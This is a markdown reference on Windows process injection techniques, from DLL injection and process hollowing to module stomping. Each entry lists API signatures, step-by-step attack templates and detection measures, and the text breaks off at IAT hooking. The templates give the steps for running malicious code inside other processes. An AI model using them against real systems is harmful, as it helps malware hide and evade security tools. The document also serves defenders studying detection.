[**`SOCKADDR_IN6`**](https://docs.microsoft.com/en-us/windows/win32/api/ws2ipdef/ns-ws2ipdef-sockaddr_in6)
```cpp
#include <ws2ipdef.h>
// Represents an IPv6 socket address, containing the IPv6 address, port number, flow info, and address family.
typedef struct sockaddr_in6 {
    short          sin6_family;
    u_short        sin6_port;
    u_long         sin6_flowinfo;
    struct in6_addr sin6_addr;
    u_long         sin6_scope_id;
} SOCKADDR_IN6, *PSOCKADDR_IN6, *LPSOCKADDR_IN6;
```
[**`IN6_ADDR`**](https://learn.microsoft.com/en-us/windows/win32/api/in6addr/ns-in6addr-in6_addr)
```cpp
#include <in6addr.h>
// Represents an IPv6 address.
typedef struct in6_addr {
    union {
        u_char Byte[16];
        u_short Word[8];
    } u;
} IN6_ADDR, *PIN6_ADDR, *LPIN6_ADDR;
```

# Code Injection Techniques

## 1. DLL Injection

This technique forces a process to load a malicious DLL.

Key APIs:
- [`OpenProcess`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)
  ```c
  HANDLE OpenProcess(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
  );
  ```
- [`VirtualAllocEx`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)
  ```c
  LPVOID VirtualAllocEx(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
  );
  ```
- [`WriteProcessMemory`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
  ```c
  BOOL WriteProcessMemory(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten
  );
  ```
- [`CreateRemoteThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread)
  ```c
  HANDLE CreateRemoteThread(
    HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
  );
  ```
- [`GetProcAddress`](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
  ```c
  FARPROC GetProcAddress(
    HMODULE hModule,
    LPCSTR  lpProcName
  );
  ```
- [`LoadLibrary`](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)
  ```c
  HMODULE LoadLibraryA(
    LPCSTR lpLibFileName
  );
  ```
- `NtCreateThread` (Undocumented)
  ```c
  NTSTATUS NTAPI NtCreateThread(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    OUT PCLIENT_ID ClientId,
    IN PCONTEXT ThreadContext,
    IN PINITIAL_TEB InitialTeb,
    IN BOOLEAN CreateSuspended
  );
  ```
- `RtlCreateUserThread` (Undocumented)
  ```c
  NTSTATUS NTAPI RtlCreateUserThread(
    IN HANDLE ProcessHandle,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN BOOLEAN CreateSuspended,
    IN ULONG StackZeroBits,
    IN OUT PULONG StackReserved,
    IN OUT PULONG StackCommit,
    IN PVOID StartAddress,
    IN PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientId
  );
  ```

Template:
1. Open the target process with `OpenProcess`
2. Allocate memory in the target process with `VirtualAllocEx`
3. Write the DLL path to the allocated memory with `WriteProcessMemory`
4. Get the address of `LoadLibraryA` using `GetProcAddress`
5. Create a remote thread in the target process with `CreateRemoteThread`, pointing to `LoadLibraryA` pass the address of `LoadLibraryA` as the `lpStartAddress` parameter.
6. (Optional) Use `NtCreateThread` or `RtlCreateUserThread` for alternative thread creation methods

Detection and Defense:
- Monitor for suspicious process access and memory allocation patterns
- Use application whitelisting to prevent unauthorized DLLs from loading
- Implement process integrity checks
- Use tools like Microsoft's Process Monitor to detect DLL injection attempts
  
## 2. PE Injection

This technique involves writing and executing malicious code in a remote process or the same process (self-injection). 

Key APIs:
- [`OpenThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread)
  ```c
  HANDLE OpenThread(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwThreadId
  );
  ```
- [`SuspendThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread)
  ```c
  DWORD SuspendThread(
    HANDLE hThread
  );
  ```
- `VirtualAllocEx` (see above)
- `WriteProcessMemory` (see above)
- [`SetThreadContext`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext)
  ```c
  BOOL SetThreadContext(
    HANDLE        hThread,
    const CONTEXT *lpContext
  );
  ```
- [`ResumeThread`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread)
  ```c
  DWORD ResumeThread(
    HANDLE hThread
  );
  ```
- `NtResumeThread` (Undocumented)
  ```c
  NTSTATUS NTAPI NtResumeThread(
    IN HANDLE ThreadHandle,
    OUT PULONG PreviousSuspendCount OPTIONAL
  );
  ```

Template:
1. Open the target thread with `OpenThread`
2. Suspend the thread with `SuspendThread`
3. Allocate memory in the target process with `VirtualAllocEx`
4. Write the malicious code to the allocated memory with `WriteProcessMemory`
5. Modify the thread context to point to the injected code with `SetThreadContext`
6. Resume the thread with `ResumeThread` or `NtResumeThread`

Detection and Defense:
- Monitor for unusual thread suspension and resumption patterns
- Implement memory integrity checks
- Use Endpoint Detection and Response (EDR) solutions to detect suspicious memory modifications
- Employ runtime process memory scanning techniques

## 3. Reflective Injection

Similar to PE Injection but avoids using `LoadLibrary` and `CreateRemoteThread`. Involves writing a custom loader that can load a DLL from memory without using the standard Windows loader.

Key APIs:
- [`CreateFileMapping`](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga)
  ```c
  HANDLE CreateFileMappingA(
    HANDLE                hFile,
    LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
    DWORD                 flProtect,
    DWORD                 dwMaximumSizeHigh,
    DWORD                 dwMaximumSizeLow,
    LPCSTR                lpName
  );
  ```
- [`MapViewOfFile`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile)
  ```c
  LPVOID MapViewOfFile(
    HANDLE hFileMappingObject,
    DWORD  dwDesiredAccess,
    DWORD  dwFileOffsetHigh,
    DWORD  dwFileOffsetLow,
    SIZE_T dwNumberOfBytesToMap
  );
  ```
- `OpenProcess` (see above)
- [`memcpy`](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/memcpy-wmemcpy)
  ```c
  void *memcpy(
     void *dest,
     const void *src,
     size_t count
  );
  ```
- `ZwMapViewOfSection` (Documented for kernel-mode)
  ```c
  NTSTATUS ZwMapViewOfSection(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
  );
  ```
- `CreateThread` (see CreateRemoteThread above)
- `NtQueueApcThread` (Undocumented)
  ```c
  NTSTATUS NTAPI NtQueueApcThread(
    IN HANDLE ThreadHandle,
    IN PIO_APC_ROUTINE ApcRoutine,
    IN PVOID ApcRoutineContext OPTIONAL,
    IN PIO_STATUS_BLOCK ApcStatusBlock OPTIONAL,
    IN ULONG ApcReserved OPTIONAL
  );
  ```
- `RtlCreateUserThread` (see above)

Additional APIs sometimes used:
- [`VirtualQueryEx`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex)
  ```c
  SIZE_T VirtualQueryEx(
    HANDLE                    hProcess,
    LPCVOID                   lpAddress,
    PMEMORY_BASIC_INFORMATION lpBuffer,
    SIZE_T                    dwLength
  );
  ```
- [`ReadProcessMemory`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory)
  ```c
  BOOL ReadProcessMemory(
    HANDLE  hProcess,
    LPCVOID lpBaseAddress,
    LPVOID  lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesRead
  );
  ```

Template:
1. Create a file mapping of the DLL with `CreateFileMapping`
2. Map a view of the file with `MapViewOfFile`
3. Open the target process with `OpenProcess`
4. Allocate memory in the target process with `VirtualAllocEx`
5. Copy the DLL contents to the allocated memory with `WriteProcessMemory`
6. Perform manual loading and relocation of the DLL in the target process
- Parse the PE headers
- Allocate memory for each section
- Copy sections to allocated memory
- Process the relocation table:
	- Enumerate relocation entries
	- Apply relocations based on the new base address
- Resolve imports:
	- Walk the import directory
	- For each imported function, resolve its address using GetProcAddress
	- Write the resolved addresses to the IAT
7. Execute the DLL's entry point using one of the thread creation methods

Detection and Defense:
- Implement advanced memory scanning techniques to detect injected code
- Use behavior-based detection to identify suspicious memory allocation patterns
- Monitor for unusual file mapping operations
- Employ heuristic-based detection methods to identify reflective loaders
## 4. APC Injection

This technique allows code execution in a specific thread by attaching to an Asynchronous Procedure Call (APC) queue.  Works best with alertable threads (those that call alertable wait functions).

Key APIs:
- [`CreateToolhelp32Snapshot`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)
  ```c
  HANDLE CreateToolhelp32Snapshot(
    DWORD dwFlags,
    DWORD th32ProcessID
  );
  ```
- [`Process32First`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first)
  ```c
  BOOL Process32First(
    HANDLE           hSnapshot,
    LPPROCESSENTRY32 lppe
  );
  ```
- [`Process32Next`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next)
  ```c
  BOOL Process32Next(
    HANDLE           hSnapshot,
    LPPROCESSENTRY32 lppe
  );
  ```
- [`Thread32First`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first)
  ```c
  BOOL Thread32First(
    HANDLE          hSnapshot,
    LPTHREADENTRY32 lpte
  );
  ```
- [`Thread32Next`](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next)
  ```c
  BOOL Thread32Next(
    HANDLE          hSnapshot,
    LPTHREADENTRY32 lpte
  );
  ```
- [`QueueUserAPC`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc)
  ```c
  DWORD QueueUserAPC(
    PAPCFUNC  pfnAPC,
    HANDLE    hThread,
    ULONG_PTR dwData
  );
  ```
- `KeInitializeAPC` (Kernel-mode, undocumented)
  ```c
  VOID KeInitializeApc(
    PRKAPC Apc,
    PRKTHREAD Thread,
    KAPC_ENVIRONMENT Environment,
    PKKERNEL_ROUTINE KernelRoutine,
    PKRUNDOWN_ROUTINE RundownRoutine,
    PKNORMAL_ROUTINE NormalRoutine,
    KPROCESSOR_MODE ProcessorMode,
    PVOID NormalContext
  );
  ```

Template:
1. Create a snapshot of the system processes with `CreateToolhelp32Snapshot`
2. Enumerate processes and threads using `Process32First`, `Process32Next`, `Thread32First`, and `Thread32Next`
3. Open the target process with `OpenProcess`
4. Allocate memory in the target process with `VirtualAllocEx`
5. Write the malicious code to the allocated memory with `WriteProcessMemory`
6. Queue an APC to the target thread with `QueueUserAPC`, pointing to the injected code

Detection and Defense:
- Monitor for suspicious APC queue operations
- Implement thread execution monitoring to detect unexpected code execution
- Use EDR solutions with capabilities to detect APC abuse
- Employ runtime analysis to identify unusual thread behavior

## 5. Process Hollowing (Process Replacement)

This technique "drains out" the entire content of a process and inserts malicious content into it. 

Key APIs:
- [`CreateProcess`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
  ```c
  BOOL CreateProcessA(
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
  );
  ```
- `NtQueryInformationProcess` (Undocumented)
  ```c
  NTSTATUS NTAPI NtQueryInformationProcess(
    IN HANDLE ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID ProcessInformation,
    IN ULONG ProcessInformationLength,
    OUT PULONG ReturnLength OPTIONAL
  );
  ```
- [`GetModuleHandle`](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)
  ```c
  HMODULE GetModuleHandleA(
    LPCSTR lpModuleName
  );
  ```
- `ZwUnmapViewOfSection` / `NtUnmapViewOfSection` (Undocumented)
  ```c
  NTSTATUS NTAPI NtUnmapViewOfSection(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress
  );
  ```
- `VirtualAllocEx` (see above)
- `WriteProcessMemory` (see above)
- [`GetThreadContext`](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext)
  ```c
  BOOL GetThreadContext(
    HANDLE    hThread,
    LPCONTEXT lpContext
  );
  ```
- `SetThreadContext` (see above)
- `ResumeThread` (see above)

Template:
1. Create a new process in a suspended state using `CreateProcess` with `CREATE_SUSPENDED` flag
2. Get the process information using `NtQueryInformationProcess`
3. Unmap the original executable from the process using `NtUnmapViewOfSection` after unmapping the original executable, adjust the image base address in the PEB (Process Environment Block) to point to the new allocated memory.
4. Adjust the image base address in the PEB:
- Use `ReadProcessMemory` to read the PEB
- Locate the `ImageBaseAddress` field
- Use `WriteProcessMemory` to update it with the address of the newly allocated memory
5. Allocate memory in the target process with `VirtualAllocEx`
6. Write the malicious executable to the allocated memory with `WriteProcessMemory`
7. Update the thread context to point to the new entry point using `GetThreadContext` and `SetThreadContext`
8. Resume the main thread of the process with `ResumeThread`

Detection and Defense:
- Implement process integrity checks to detect hollowed processes
- Monitor for suspicious process creation patterns, especially with the `CREATE_SUSPENDED` flag
- Use memory forensics tools to identify signs of process hollowing
- Employ behavior-based detection to identify processes with unexpected memory layouts
## 6. AtomBombing

A variant of APC injection that works by splitting the malicious payload into separate strings and using atoms. this technique relies on the fact that atoms are shared across processes.

Key APIs:
- `OpenThread` (see above)
- [`GlobalAddAtom`](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globaladdatoma)
  ```c
  ATOM GlobalAddAtomA(
    LPCSTR lpString
  );
  ```
- [`GlobalGetAtomName`](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globalgetatomaname)
  ```c
  UINT GlobalGetAtomNameA(
    ATOM   nAtom,
    LPSTR  lpBuffer,
    int    nSize
  );
  ```
- `QueueUserAPC` (see above)
- `NtQueueApcThread` (Undocumented, see above)
- `NtSetContextThread` (Undocumented)
  ```c
  NTSTATUS NTAPI NtSetContextThread(
    IN HANDLE ThreadHandle,
    IN PCONTEXT ThreadContext
  );
  ```

Template:
1. Split the malicious payload into small chunks
2. For each chunk, use `GlobalAddAtom` to create a global atom
3. Open the target thread with `OpenThread`
4. Queue an APC to the target thread with `QueueUserAPC` or `NtQueueApcThread`
5. In the APC routine, use `GlobalGetAtomName` to retrieve the payload chunks
6. Assemble the payload in the target process memory
7. Execute the payload using `NtSetContextThread` or by queuing another APC

Detection and Defense:
- Monitor for unusual patterns of atom creation and retrieval
- Implement behavior-based detection for processes accessing a large number of atoms
- Use EDR solutions with capabilities to detect AtomBombing techniques
- Employ runtime analysis to identify suspicious APC usage in combination with atom manipulation

## 7. Process Doppelgänging

An evolution of Process Hollowing that replaces the image before the process is created. this technique leverages the Windows Transactional NTFS (TxF) to temporarily replace a legitimate file with a malicious one during process creation.

Key APIs:
- [`CreateTransaction`](https://docs.microsoft.com/en-us/windows/win32/api/ktmw32/nf-ktmw32-createtransaction)
  ```c
  HANDLE CreateTransaction(
    LPSECURITY_ATTRIBUTES   lpTransactionAttributes,
    LPGUID                  UOW,
    DWORD                   CreateOptions,
    DWORD                   IsolationLevel,
    DWORD                   IsolationFlags,
    DWORD                   Timeout,
    LPWSTR                  Description
  );
  ```
- [`CreateFileTransacted`](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfiletransacteda)
  ```c
  HANDLE CreateFileTransactedA(
    LPCSTR                lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile,
    HANDLE                hTransaction,
    PUSHORT               pusMiniVersion,
    PVOID                 lpExtendedParameter
  );
  ```
- `NtCreateSection` (Undocumented)
  ```c
  NTSTATUS NTAPI NtCreateSection(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
  );
  ```
- `NtCreateProcessEx` (Undocumented)
  ```c
  NTSTATUS NTAPI NtCreateProcessEx(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ParentProcess,
    IN ULONG Flags,
    IN HANDLE SectionHandle OPTIONAL,
    IN HANDLE DebugPort OPTIONAL,
    IN HANDLE ExceptionPort OPTIONAL,
    IN BOOLEAN InJob
  );
  ```
- `NtQueryInformationProcess` (Undocumented, see above)
- `NtCreateThreadEx` (Undocumented)
  ```c
  NTSTATUS NTAPI NtCreateThreadEx(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL
  );
  ```
- [`RollbackTransaction`](https://docs.microsoft.com/en-us/windows/win32/api/ktmw32/nf-ktmw32-rollbacktransaction)
  ```c
  BOOL RollbackTransaction(
    HANDLE TransactionHandle
  );
  ```

Template:
1. Create a transaction using `CreateTransaction`
2. Create a transacted file with `CreateFileTransacted`
3. Write the malicious payload to the transacted file
4. Create a section for the transacted file using `NtCreateSection`
5. Create a process from the section using `NtCreateProcessEx`
6. Create a thread in the new process with `NtCreateThreadEx`
7. Rollback the transaction with `RollbackTransaction` to remove traces of the malicious file

Detection and Defense:
- Monitor for suspicious transactional NTFS operations
- Implement file integrity monitoring to detect temporary file replacements
- Use advanced EDR solutions capable of detecting Process Doppelgänging techniques
- Employ behavior-based detection to identify processes created from transacted files

## 8. Process Herpaderping

Similar to Process Doppelgänging, but exploits the order of process creation and security checks. this technique exploits the fact that Windows performs security checks on the executable file before it starts executing the process.

Key APIs:
- [`CreateFile`](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)
  ```c
  HANDLE CreateFileA(
    LPCSTR                lpFileName,
    DWORD                 dwDesiredAccess,
    DWORD                 dwShareMode,
    LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    DWORD                 dwCreationDisposition,
    DWORD                 dwFlagsAndAttributes,
    HANDLE                hTemplateFile
  );
  ```
- `NtCreateSection` (Undocumented, see above)
- `NtCreateProcessEx` (Undocumented, see above)
- `NtCreateThreadEx` (Undocumented, see above)

Template:
1. Create a file with `CreateFile`
2. Write the malicious payload to the file
3. Create a section for the file using `NtCreateSection`
4. Overwrite the file content with benign data
5. Create a process from the section using `NtCreateProcessEx`
6. Create a thread in the new process with `NtCreateThreadEx`

Detection and Defense:
- Implement file integrity monitoring to detect rapid changes in executable files
- Use behavior-based detection to identify processes with mismatched file contents
- Employ advanced EDR solutions capable of detecting Process Herpaderping techniques
- Monitor for suspicious patterns of file creation, modification, and process creation

## 9. Hooking Injection

This technique uses hooking-related functions to inject a malicious DLL. this technique can also be used for API hooking, not just for injection.

Key APIs:
- [`SetWindowsHookEx`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)
  ```c
  HHOOK SetWindowsHookExA(
    int       idHook,
    HOOKPROC  lpfn,
    HINSTANCE hmod,
    DWORD     dwThreadId
  );
  ```
- [`PostThreadMessage`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-postthreadmessagea)
  ```c
  BOOL PostThreadMessageA(
    DWORD  idThread,
    UINT   Msg,
    WPARAM wParam,
    LPARAM lParam
  );
  ```

Template:
1. Create a DLL containing the hook procedure
2. Use `SetWindowsHookEx` to set a hook in the target process
3. Trigger the hook by sending a message with `PostThreadMessage`

Detection and Defense:
- Monitor for suspicious usage of `SetWindowsHookEx`, especially with global hooks
- Implement API hooking detection mechanisms
- Use EDR solutions with capabilities to detect abnormal hook installations
- Employ behavior-based detection to identify processes with unexpected loaded modules

## 10. Extra Windows Memory Injection

This technique injects code into a process by using the Extra Windows Memory (EWM), which is appended to the instance of a class during window class registration. less common and might be detected by some security solutions.

Key APIs:
- [`FindWindowA`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-findwindowa)
  ```c
  HWND FindWindowA(
    LPCSTR lpClassName,
    LPCSTR lpWindowName
  );
  ```
- [`GetWindowThreadProcessId`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getwindowthreadprocessid)
  ```c
  DWORD GetWindowThreadProcessId(
    HWND    hWnd,
    LPDWORD lpdwProcessId
  );
  ```
- `OpenProcess` (see above)
- `VirtualAllocEx` (see above)
- `WriteProcessMemory` (see above)
- [`SetWindowLongPtrA`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowlongptra)
  ```c
  LONG_PTR SetWindowLongPtrA(
    HWND     hWnd,
    int      nIndex,
    LONG_PTR dwNewLong
  );
  ```
- [`SendNotifyMessage`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-sendnotifymessagea)
  ```c
  BOOL SendNotifyMessageA(
    HWND   hWnd,
    UINT   Msg,
    WPARAM wParam,
    LPARAM lParam
  );
  ```

Template:
1. Find the target window with `FindWindowA`
2. Get the process ID of the window with `GetWindowThreadProcessId`
3. Open the process with `OpenProcess`
4. Allocate memory in the target process with `VirtualAllocEx`
5. Write the malicious code to the allocated memory with `WriteProcessMemory`
6. Use `SetWindowLongPtrA` to modify the window's extra memory
7. Trigger the execution with `SendNotifyMessage`

Detection and Defense:
- Monitor for suspicious modifications to window properties
- Implement integrity checks for window class data
- Use EDR solutions with capabilities to detect EWM manipulation
- Employ behavior-based detection to identify processes with unexpected changes in window properties

## 11. Propagate Injection

This technique is used to inject malicious code into processes with medium integrity level, such as explorer.exe. It works by enumerating windows and subclassing them. can be particularly effective for privilege escalation.

Key APIs:
- [`EnumWindows`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumwindows)
  ```c
  BOOL EnumWindows(
    WNDENUMPROC lpEnumFunc,
    LPARAM      lParam
  );
  ```
- [`EnumChildWindows`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumchildwindows)
  ```c
  BOOL EnumChildWindows(
    HWND        hWndParent,
    WNDENUMPROC lpEnumFunc,
    LPARAM      lParam
  );
  ```
- [`EnumProps`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-enumpropa)
  ```c
  int EnumPropsA(
    HWND      hWnd,
    PROPENUMPROCA lpEnumFunc
  );
  ```
- [`GetProp`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getpropa)
  ```c
  HANDLE GetPropA(
    HWND    hWnd,
    LPCSTR lpString
  );
  ```
- [`SetWindowSubclass`](https://docs.microsoft.com/en-us/windows/win32/api/commctrl/nf-commctrl-setwindowsubclass)
  ```c
  BOOL SetWindowSubclass(
    HWND              hWnd,
    SUBCLASSPROC      pfnSubclass,
    UINT_PTR          uIdSubclass,
    DWORD_PTR         dwRefData
  );
  ```
- `FindWindow` (see above)
- `FindWindowEx` (see above)
- `GetWindowThreadProcessId` (see above)
- `OpenProcess` (see above)
- `ReadProcessMemory` (see above)
- `VirtualAllocEx` (see above)
- `WriteProcessMemory` (see above)
- [`SetPropA`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setpropa)
  ```c
  BOOL SetPropA(
    HWND    hWnd,
    LPCSTR  lpString,
    HANDLE  hData
  );
  ```
- [`PostMessage`](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-postmessagea)
  ```c
  BOOL PostMessageA(
    HWND   hWnd,
    UINT   Msg,
    WPARAM wParam,
    LPARAM lParam
  );
  ```

Template:
1. Enumerate windows using `EnumWindows` and `EnumChildWindows`
2. For each window, check for subclassed windows using `EnumProps` and `GetProp`
3. Open the target process with `OpenProcess`
4. Allocate memory in the target process with `VirtualAllocEx`
5. Write the malicious code to the allocated memory with `WriteProcessMemory`
6. Subclass the window using `SetWindowSubclass`
7. Set a new property with `SetPropA` to store the payload
8. Trigger execution by sending a message with `PostMessage`

Detection and Defense:
- Monitor for suspicious patterns of window enumeration and subclassing
- Implement integrity checks for window subclassing
- Use EDR solutions with capabilities to detect propagate injection techniques
- Employ behavior-based detection to identify processes with unexpected changes in window subclassing

## 12. Heap Spray

While not strictly an injection technique, heap spraying is often used in conjunction with other injection methods to facilitate exploit payload delivery. modern browsers and operating systems have implemented mitigations against this.

Key APIs:
- [`HeapAlloc`](https://docs.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc)
  ```c
  LPVOID HeapAlloc(
    HANDLE hHeap,
    DWORD  dwFlags,
    SIZE_T dwBytes
  );
  ```
- [`VirtualAlloc`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
  ```c
  LPVOID VirtualAlloc(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
  );
  ```

Template:
1. Allocate multiple memory blocks using `HeapAlloc` or `VirtualAlloc`
2. Fill these blocks with a combination of NOP sleds and the payload
3. Repeat this process to cover a large portion of the process's address space

Detection and Defense:
- Implement memory allocation monitoring to detect suspicious patterns
- Use address space layout randomization (ASLR) to mitigate heap spraying attacks
- Employ EDR solutions with capabilities to detect heap spraying techniques
- Implement browser-specific mitigations, such as randomizing heap allocation

## 13. Thread Execution Hijacking

This technique involves suspending a legitimate thread in a target process, modifying its execution context to point to malicious code, and then resuming the thread. saving and restoring the original thread context required to maintain process stability.

Key APIs:
- `OpenThread` (see above)
- `SuspendThread` (see above)
- `GetThreadContext` (see above)
- `SetThreadContext` (see above)
- `VirtualAllocEx` (see above)
- `WriteProcessMemory` (see above)
- `ResumeThread` (see above)

Template:
1. Open the target thread with `OpenThread`
2. Suspend the thread with `SuspendThread`
3. Get the thread context with `GetThreadContext`
4. Allocate memory in the target process with `VirtualAllocEx`
5. Write the malicious code to the allocated memory with `WriteProcessMemory`
6. Modify the thread context to point to the injected code with `SetThreadContext`
7. Resume the thread with `ResumeThread`

Detection and Defense:
- Monitor for suspicious patterns of thread suspension and resumption
- Implement thread execution monitoring to detect unexpected changes in execution flow
- Use EDR solutions with capabilities to detect thread hijacking techniques
- Employ runtime analysis to identify unusual thread behavior

## 14. Module Stomping

This technique overwrites the memory of a legitimate module in the target process with malicious code, potentially bypassing some security checks. detected by integrity checks on loaded modules.

Key APIs:
- [`GetModuleInformation`](https://docs.microsoft.com/en-us/windows/win32/api/psapi/nf-psapi-getmoduleinformation)
  ```c
  BOOL GetModuleInformation(
    HANDLE       hProcess,
    HMODULE      hModule,
    LPMODULEINFO lpmodinfo,
    DWORD        cb
  );
  ```
- [`VirtualProtectEx`](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex)
  ```c
  BOOL VirtualProtectEx(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
  );
  ```
- `WriteProcessMemory` (see above)

Template:
1. Open the target process with `OpenProcess`
2. Get information about the target module using `GetModuleInformation`
3. Change the memory protection of the module to writable using `VirtualProtectEx`
4. Overwrite the module's code section with malicious code using `WriteProcessMemory`
5. Restore the original memory protection with `VirtualProtectEx`

Detection and Defense:
- Implement module integrity checks to detect modifications to loaded modules
- Use EDR solutions with capabilities to detect module stomping techniques
- Employ memory forensics tools to identify signs of module stomping
- Implement code signing and verification mechanisms for loaded modules

## 15. IAT Hooking

This technique modifies the Import Address Table (IAT) of a process to redirect function calls to malicious code. detected by comparing the IAT entries with the actual function addresses in the target DLLs.

Key APIs:
- [`GetProcAddress`](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
  ```c
  FARPROC GetProcAddress(
    HMODULE hModule,
    LPCSTR  lpProcName
  );
  ```
